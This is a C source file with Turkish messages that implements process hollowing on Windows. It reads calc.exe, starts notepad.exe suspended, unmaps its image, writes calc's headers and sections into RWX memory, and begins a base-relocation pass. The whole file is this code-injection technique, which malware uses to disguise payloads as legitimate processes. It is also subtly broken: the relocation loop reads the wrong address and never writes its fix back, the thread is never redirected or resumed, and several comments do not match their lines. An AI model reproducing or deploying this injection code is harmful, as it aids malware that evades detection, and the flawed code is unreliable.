#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <string.h>

STARTUPINFOA si;
PROCESS_INFORMATION pi;


void main() { //resume
	// Image'i alinacak dosya
	HANDLE HFile = CreateFileA(
		"C:\\Windows\\syswow64\\calc.exe",
		GENERIC_READ,
		0, //suspended
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_READONLY,
		NULL);

	if (HFile == INVALID_HANDLE_VALUE) {
		printf("Dosya acilamadi!");
		exit(EXIT_FAILURE);
	}

	DWORD fileSize = GetFileSize(HFile, NULL);

	if (fileSize == INVALID_FILE_SIZE)
	{
		printf("Dosya okunamadi!");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("Dosyadan %d byte okundu.\n", fileSize);
	}

	LPVOID allocatedMemAddr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)fileSize);

	if (allocatedMemAddr == NULL)
	{
		printf("Alan tahsis edilemedi!");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("Heap uzerinde yeterli alan tahsis edildi.\n");
	}

	DWORD numberOfBytesRead;

	if (ReadFile(HFile, allocatedMemAddr, fileSize, &numberOfBytesRead, NULL) == FALSE)
	{
		printf("Dosyadan okuma yapilamadi!\n");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("Heap uzerinde tahsis edilen alana %d byte aktarildi\n", numberOfBytesRead);
	}

	PIMAGE_DOS_HEADER DOSHeader = (PIMAGE_DOS_HEADER)allocatedMemAddr;
	PIMAGE_NT_HEADERS NTHeader = (PIMAGE_NT_HEADERS)((DWORD)allocatedMemAddr + DOSHeader->e_lfanew);
	DWORD ImageSize = NTHeader->OptionalHeader.SizeOfImage;
	//unmapped
	if (CreateProcessA(
		NULL,
		"c:\\windows\\syswow64\\notepad.exe",
		NULL,
		NULL,
		TRUE,
		4,
		NULL,
		NULL,
		&si, &pi) == 0) {
		printf("Process olusturulamadi!\n");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("pid number: %d\n", pi.dwProcessId);
	};
	
	typedef NTSTATUS(NTAPI* NtQueryInformationProcessPtr)(
		IN HANDLE ProcessHandle,
		IN PROCESSINFOCLASS ProcessInformationClass,
		OUT PVOID ProcessInformation,
		IN ULONG ProcessInformationLength,
		OUT PULONG ReturnLength OPTIONAL);

	PROCESS_BASIC_INFORMATION status;

	HMODULE Hntdll = LoadLibraryA("ntdll.dll");

	NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(Hntdll, "NtQueryInformationProcess");
	DWORD returnLenght = 0;

	NtQueryInformationProcess(
		pi.hProcess, 
		ProcessBasicInformation, 
		&status, 
		sizeof(PROCESS_BASIC_INFORMATION), 
		&returnLenght);
	
	DWORD_PTR pebaddr = (DWORD)status.PebBaseAddress + 8;
	int a = 5;
	HANDLE HtargetProc = pi.hProcess;
	DWORD targetImageBaseAddress = NULL;

	ReadProcessMemory(
		HtargetProc, 
		(LPCVOID)pebaddr, 
		&targetImageBaseAddress, 
		4, 
		&returnLenght);

	printf("Target Image Base Address: %p\n", targetImageBaseAddress);

	typedef NTSTATUS(NTAPI* NtUnmapViewOfSectionPtr)(
		IN HANDLE               ProcessHandle,
		IN PVOID                BaseAddress
		);
	
	NtUnmapViewOfSectionPtr NtUnmapViewOfSection = (NtUnmapViewOfSectionPtr)GetProcAddress(Hntdll, "NtUnmapViewOfSection");

	NtUnmapViewOfSection(HtargetProc, targetImageBaseAddress);

	VirtualAllocEx(
		HtargetProc, 
		(LPVOID)targetImageBaseAddress, 
		ImageSize, 
		MEM_COMMIT | MEM_RESERVE,  // 111111111111111111111 111111111111111111111111
		PAGE_EXECUTE_READWRITE);


	WriteProcessMemory(
		HtargetProc, 
		(LPVOID)targetImageBaseAddress, 
		(LPCVOID)allocatedMemAddr, 
		NTHeader->OptionalHeader.SizeOfHeaders, 
		NULL);

	PIMAGE_SECTION_HEADER SECTIONHeader = (PIMAGE_SECTION_HEADER)((DWORD)allocatedMemAddr + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER oldSECTIONHeader = SECTIONHeader;
	
	
	for (WORD i = 0; i < NTHeader->FileHeader.NumberOfSections; i++) {
		DWORD destSectionLocation = targetImageBaseAddress + SECTIONHeader->VirtualAddress,
			sourceSectionLocation = (DWORD)allocatedMemAddr + SECTIONHeader->PointerToRawData,
			NumberOfBytesWritten = 0;
		
		WriteProcessMemory(
			HtargetProc, 
			(LPVOID)destSectionLocation, 
			(LPCVOID)sourceSectionLocation, 
			SECTIONHeader->SizeOfRawData, 
			&NumberOfBytesWritten);

		//printf("Raw Size: %x\n", SECTIONHeader->SizeOfRawData);
		SECTIONHeader++;
	}

	SECTIONHeader = oldSECTIONHeader;

	DWORD delta = (DWORD)targetImageBaseAddress - NTHeader->OptionalHeader.ImageBase;

	for (int i = 0; i < NTHeader->FileHeader.NumberOfSections; i++) {
		if ((strcmp(&SECTIONHeader->Name, ".reloc")) != 0) {
			SECTIONHeader++;
			continue;
		}
		PIMAGE_BASE_RELOCATION baseRelocTable = (PIMAGE_BASE_RELOCATION)((DWORD)allocatedMemAddr + SECTIONHeader->PointerToRawData);
		int k = 1;

		while (baseRelocTable->SizeOfBlock > 0) {
			
			DWORD numberOfEntry = (baseRelocTable->SizeOfBlock - 8) / sizeof(WORD);

			printf("%d.Block Size: %x and has %x entries\n", k, baseRelocTable->SizeOfBlock, numberOfEntry);

			LPWORD entryList = (LPWORD)((DWORD)baseRelocTable + sizeof(IMAGE_BASE_RELOCATION));

			for (DWORD j = 0; j < numberOfEntry; j++) {
				int offset = entryList[j] & 0x0fff;
				printf("\t%d.Offset: %x\n", j + 1, offset);
				DWORD buff = 0;
				ReadProcessMemory(
					HtargetProc,
					(LPVOID)((DWORD)targetImageBaseAddress + NTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress),
					&buff, sizeof(WORD) ,NULL);
				int* p = &buff;
				*p += delta;
				// VirtualAddr RVA
				
			}

			baseRelocTable = (PIMAGE_BASE_RELOCATION)((DWORD)baseRelocTable + baseRelocTable->SizeOfBlock);
			k++;
		}
		
	}
	
	
}
